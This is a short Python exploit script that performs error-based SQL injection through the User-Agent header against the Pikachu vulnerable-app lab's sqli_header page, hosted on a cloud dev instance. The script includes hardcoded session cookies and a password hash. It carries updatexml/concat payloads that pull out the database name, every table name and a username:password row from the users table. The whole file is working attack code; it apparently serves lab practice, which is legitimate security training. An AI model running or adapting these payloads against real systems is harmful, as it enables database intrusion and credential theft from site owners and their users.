import requests
import re

URL = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_header/sqli_header.php"
COOKIES = {
    "ant[uname]": "admin",
    "ant[pw]": "10470c3b4b1fed12c3baac014be15fac67c6e815",
    "PHPSESSID": "556pahfpk25mu8nqgggdpav30s3"
}

def get_info(sql_str):
    payload = f"' or updatexml(1,concat(0x7e,{sql_str},0x7e),1) or '"
    headers = {
        "User-Agent": payload
    }
    print(f"[+] Payload:\n{payload}\n")
    resp = requests.get(URL, cookies=COOKIES, headers=headers)
    # 修正正则：匹配原始单引号，不再匹配html实体 &#039;
    match = re.search(r"XPATH syntax error: '~(.*?)~'", resp.text)
    if match:
        return match.group(1)
    else:
        print("===完整响应===")
        print(resp.text)
        return "未捕获报错"


if __name__ == "__main__":
    #1、爆库名
    res_db = get_info("database()")
    print(f"数据库名: {res_db}\n")

    #2、爆表名
    table_payload = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
    tables = get_info(table_payload)
    print(f"所有表: {tables}\n")

    #3、爆users账号密码
    user_payload = "(select concat(username,0x3a,password) from pikachu.users limit 0,1)"
    user_data = get_info(user_payload)
    print(f"账号密码：{user_data}")
